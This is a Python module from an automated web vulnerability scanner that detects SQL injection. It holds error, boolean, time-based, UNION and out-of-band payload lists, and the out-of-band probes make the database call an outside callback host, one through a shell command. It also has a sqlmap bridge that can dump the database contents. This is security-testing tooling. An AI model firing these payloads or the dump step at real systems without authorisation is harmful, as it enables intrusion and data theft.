"""
SQL Injection detection engine.

Four signal classes (cheapest first):
1. Error-based: DBMS error signatures in response body
2. Boolean differential: true/false condition changes response
3. Time-based: injected SLEEP/WAITFOR causes measurable latency delta
4. Out-of-band: DNS/HTTP exfiltration via OAST server

Confirmed findings can be escalated to sqlmap for deep extraction.
"""
from __future__ import annotations

import asyncio
import re
import statistics
from typing import Optional

import structlog

from nightfall.core.http import Evidence

logger = structlog.get_logger(__name__)


# ── DBMS Error Signature Corpus ──────────────────────────────────────────────

ERROR_SIGNATURES: dict[str, re.Pattern] = {
    "mysql": re.compile(
        r"(SQL syntax.*MySQL|Warning.*mysql_|MySQLSyntaxError|"
        r"com\.mysql\.jdbc|mysql_fetch_|mysql_num_rows|"
        r"You have an error in your SQL syntax)",
        re.I,
    ),
    "postgres": re.compile(
        r"(PG::SyntaxError|PG::\w+Error|ERROR:\s+syntax error at or near|"
        r"org\.postgresql\.util\.PSQLException|valid PostgreSQL result|"
        r"unterminated quoted string at or near)",
        re.I,
    ),
    "mssql": re.compile(
        r"(Unclosed quotation mark after the character string|"
        r"Microsoft OLE DB Provider for SQL Server|"
        r"Microsoft SQL Native Client error|ODBC SQL Server Driver|"
        r"SqlException.*System\.Data\.SqlClient|"
        r"Incorrect syntax near)",
        re.I,
    ),
    "oracle": re.compile(
        r"(ORA-\d{5}|Oracle error|oracle\.jdbc\.driver|"
        r"quoted string not properly terminated|"
        r"SQL command not properly ended|java\.sql\.SQLException)",
        re.I,
    ),
    "sqlite": re.compile(
        r"(SQLITE_ERROR|SQLite3::SQLException|near \"\w+\": syntax error|"
        r"unrecognized token|SQLITE_MISUSE)",
        re.I,
    ),
}

# ── SQL Injection Probes ────────────────────────────────────────────────────

ERROR_PROBES = [
    "'",
    "\"",
    "' OR '",
    "1'",
    "1\"",
    "1' AND '1'='",
    "') OR ('1'='1",
    "1; --",
]

BOOLEAN_PROBES = [
    # (true_condition, false_condition)
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"),
    ("1) AND (1=1", "1) AND (1=2"),
]

TIME_PROBES = {
    "mysql": "1' AND SLEEP({delay})-- -",
    "postgres": "1'; SELECT pg_sleep({delay})-- -",
    "mssql": "1'; WAITFOR DELAY '0:0:{delay}'-- -",
    "oracle": "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})-- -",
    "sqlite": "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000/2))))-- -",
    "generic": "1; SELECT SLEEP({delay})--",
}

OOB_PROBES = {
    "mysql": "1'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{nonce}.{oast_domain}\\\\a'))-- -",
    "postgres": "1'; COPY (SELECT '') TO PROGRAM 'nslookup {nonce}.{oast_domain}'-- -",
    "mssql": "1'; EXEC master..xp_dirtree '\\\\{nonce}.{oast_domain}\\a'-- -",
    "oracle": "1' AND UTL_HTTP.REQUEST('http://{nonce}.{oast_domain}/')=1-- -",
}

UNION_PROBES = [
    "' UNION SELECT {cols}--",
    "' UNION ALL SELECT {cols}--",
    "') UNION SELECT {cols}--",
    "\" UNION SELECT {cols}--",
]


async def sqli_engine(ctx, step: dict, obj) -> Optional[Evidence]:
    """Full SQLi detection pipeline.

    Runs cheap detectors first (error/boolean), then timing, then OOB.
    Returns Evidence if a signal is detected, None otherwise.
    """
    url = step.get("endpoint", "")
    params = dict(step.get("params", {}))
    method = step.get("method", "GET")

    if not params:
        params = {"q": "1"}

    # Identify the target parameter
    target_param = list(params.keys())[0] if params else "q"
    original_value = params.get(target_param, "1")

    # ── Signal 1: Error-based ────────────────────────────────────────────
    for probe in ERROR_PROBES:
        test_params = {**params, target_param: probe}
        ev = await ctx.pool.send(method, url, params=test_params)

        for dbms, pattern in ERROR_SIGNATURES.items():
            if pattern.search(ev.response_body):
                ev.vuln_class = "sqli"
                ev.subtype = "error"
                ev.param = target_param
                ev.payload = probe
                ev.confidence = 0.9
                ev.severity = "high"
                ev.extra = {"dbms": dbms}
                ev.evidence_snip = ev.response_body[:500]
                logger.info("sqli_error_detected", dbms=dbms, url=url, param=target_param)
                return ev

    # ── Signal 2: Boolean differential ───────────────────────────────────
    # Get baseline response
    baseline_ev = await ctx.pool.send(method, url, params=params)
    baseline_body = baseline_ev.response_body

    for true_cond, false_cond in BOOLEAN_PROBES:
        true_params = {**params, target_param: true_cond}
        false_params = {**params, target_param: false_cond}

        true_ev = await ctx.pool.send(method, url, params=true_params)
        false_ev = await ctx.pool.send(method, url, params=false_params)

        # True condition should match baseline, false should differ
        true_sim = _body_similarity(baseline_body, true_ev.response_body)
        false_sim = _body_similarity(baseline_body, false_ev.response_body)

        if true_sim > 0.9 and false_sim < 0.7:
            true_ev.vuln_class = "sqli"
            true_ev.subtype = "boolean"
            true_ev.param = target_param
            true_ev.payload = true_cond
            true_ev.confidence = 0.8
            true_ev.severity = "high"
            true_ev.extra = {"true_sim": round(true_sim, 3), "false_sim": round(false_sim, 3)}
            logger.info("sqli_boolean_detected", url=url, param=target_param,
                       true_sim=round(true_sim, 3), false_sim=round(false_sim, 3))
            return true_ev

    # ── Signal 3: Time-based ─────────────────────────────────────────────
    delay = 5  # seconds

    # Establish timing baseline (3 samples)
    baselines = []
    for _ in range(3):
        bev = await ctx.pool.send(method, url, params=params)
        baselines.append(bev.latency_ms)
    baseline_median = statistics.median(baselines)

    for dbms, probe_template in TIME_PROBES.items():
        probe = probe_template.format(delay=delay)
        test_params = {**params, target_param: probe}
        time_ev = await ctx.pool.send(method, url, params=test_params)

        delta = time_ev.latency_ms - baseline_median
        if delta > (delay * 1000 * 0.8):  # 80% of expected delay
            time_ev.vuln_class = "sqli"
            time_ev.subtype = "time"
            time_ev.param = target_param
            time_ev.payload = probe
            time_ev.confidence = 0.75
            time_ev.severity = "high"
            time_ev.extra = {
                "dbms_hint": dbms,
                "delay_ms": round(delta),
                "baseline_ms": round(baseline_median),
            }
            logger.info("sqli_time_detected", dbms=dbms, url=url,
                       delta_ms=round(delta), baseline_ms=round(baseline_median))
            return time_ev

    # ── Signal 4: Out-of-band (OAST) ────────────────────────────────────
    if ctx.oast:
        for dbms, probe_template in OOB_PROBES.items():
            nonce = ctx.oast.nonce()
            probe = probe_template.format(nonce=nonce, oast_domain=ctx.oast.domain)
            test_params = {**params, target_param: probe}
            oob_ev = await ctx.pool.send(method, url, params=test_params)

            if await ctx.oast.poll(nonce, timeout=8):
                oob_ev.vuln_class = "sqli"
                oob_ev.subtype = "oob"
                oob_ev.param = target_param
                oob_ev.payload = probe
                oob_ev.oob_nonce = nonce
                oob_ev.confidence = 0.9
                oob_ev.severity = "high"
                oob_ev.extra = {"dbms_hint": dbms}
                logger.info("sqli_oob_detected", dbms=dbms, url=url, nonce=nonce)
                return oob_ev

    logger.debug("sqli_no_signal", url=url, param=target_param)
    return None


async def sqli_union_detect(ctx, url: str, param: str, method: str = "GET") -> Optional[Evidence]:
    """Detect the number of columns for UNION-based injection.

    Incrementally tests UNION SELECT NULL,NULL,... until a successful response.
    """
    for num_cols in range(1, 20):
        cols = ",".join(["NULL"] * num_cols)
        for template in UNION_PROBES:
            probe = template.format(cols=cols)
            ev = await ctx.pool.send(method, url, params={param: probe})
            if ev.response_status == 200 and "UNION" not in ev.response_body[:1000]:
                ev.vuln_class = "sqli"
                ev.subtype = "union"
                ev.param = param
                ev.payload = probe
                ev.confidence = 0.85
                ev.severity = "critical"
                ev.extra = {"num_columns": num_cols}
                return ev
    return None


async def sqlmap_bridge(ctx, step: dict, obj) -> Optional[Evidence]:
    """Deep confirmation & extraction via sqlmap.

    Only called after triage approval. sqlmap -r takes a request file from
    the candidate evidence; we never hand sqlmap raw URLs without triage.
    """
    import tempfile
    import os

    url = step.get("endpoint", "")
    params = step.get("params", {})

    # Build a raw HTTP request file for sqlmap
    param_str = "&".join(f"{k}={v}" for k, v in params.items())
    request_content = f"GET {url}?{param_str} HTTP/1.1\nHost: {_extract_host(url)}\n\n"

    work_dir = os.path.join("work", "sqlmap")
    os.makedirs(work_dir, exist_ok=True)

    req_file = os.path.join(work_dir, f"request_{hash(url) % 10000}.txt")
    with open(req_file, "w") as f:
        f.write(request_content)

    try:
        proc = await asyncio.create_subprocess_exec(
            "sqlmap", "-r", req_file, "--batch", "--risk=3", "--level=5",
            "--threads=4", f"--output-dir={work_dir}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        out, _ = await asyncio.wait_for(proc.communicate(), timeout=300)
        output = out.decode("utf-8", errors="replace")

        if b"is vulnerable" in out or "is vulnerable" in output:
            logger.info("sqlmap_confirmed_vuln", url=url)
            ev = Evidence(
                url=url,
                method="GET",
                vuln_class="sqli",
                subtype="sqlmap-confirmed",
                payload=f"sqlmap -r {req_file}",
                confidence=0.95,
                severity="critical",
                evidence_snip=output[:2000],
            )

            # Attempt extraction if exploit mode is confirm
            if getattr(ctx, "exploit_mode", "") == "confirm":
                dump_proc = await asyncio.create_subprocess_exec(
                    "sqlmap", "-r", req_file, "--batch", "--dump",
                    f"--output-dir={work_dir}",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )
                dump_out, _ = await asyncio.wait_for(dump_proc.communicate(), timeout=600)
                ev.extra = {"dump_output": dump_out.decode("utf-8", errors="replace")[:5000]}

            return ev
    except FileNotFoundError:
        logger.warning("sqlmap_not_found", msg="sqlmap not on PATH — skipping bridge")
    except asyncio.TimeoutError:
        logger.warning("sqlmap_timeout", url=url)

    return None


# ── Helpers ──────────────────────────────────────────────────────────────────

def _body_similarity(body1: str, body2: str) -> float:
    """Quick similarity ratio between two response bodies.

    Uses length-based heuristic first, then character-level comparison
    for bodies of similar length.
    """
    if not body1 and not body2:
        return 1.0
    if not body1 or not body2:
        return 0.0

    # Quick length check
    len_ratio = min(len(body1), len(body2)) / max(len(body1), len(body2))
    if len_ratio < 0.5:
        return len_ratio

    # Character-level comparison (sample for performance)
    sample_size = min(2000, len(body1), len(body2))
    s1 = body1[:sample_size]
    s2 = body2[:sample_size]

    matches = sum(1 for a, b in zip(s1, s2) if a == b)
    return matches / sample_size


def _extract_host(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).hostname or "unknown"
